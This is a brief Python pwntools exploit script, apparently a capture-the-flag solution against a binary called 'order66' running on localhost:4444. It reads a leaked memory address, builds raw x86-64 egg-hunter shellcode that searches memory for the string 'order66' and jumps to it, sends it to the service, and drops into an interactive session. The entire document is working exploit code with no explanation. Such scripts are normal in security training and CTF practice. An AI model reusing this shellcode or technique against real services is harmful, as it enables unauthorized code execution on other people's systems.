from pwn import *

#elf = context.binary = ELF("./order66")
#context.log_level = 'DEBUG'
#p = process("./order66")
p = remote("localhost", 4444)


data = p.recvline()

data = data.decode()
addr = data.split(" ")[1]

addr = int(addr, 16)
p.recvline()

print(hex(addr))

shellcode = b"\x48\x31\xf6\x48\x89\xf7\x48\xbf"

shellcode += p64(addr)
shellcode+= b"\x66\x81\xcf\xff\x0f\x48\xff\xc7\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xef\xb8\x6f\x72\x64\x65\xaf\x75\xef\xb8\x72\x36\x36\x00\xaf\x75\xe7\xff\xd7"

p.sendline(shellcode)

p.interactive()
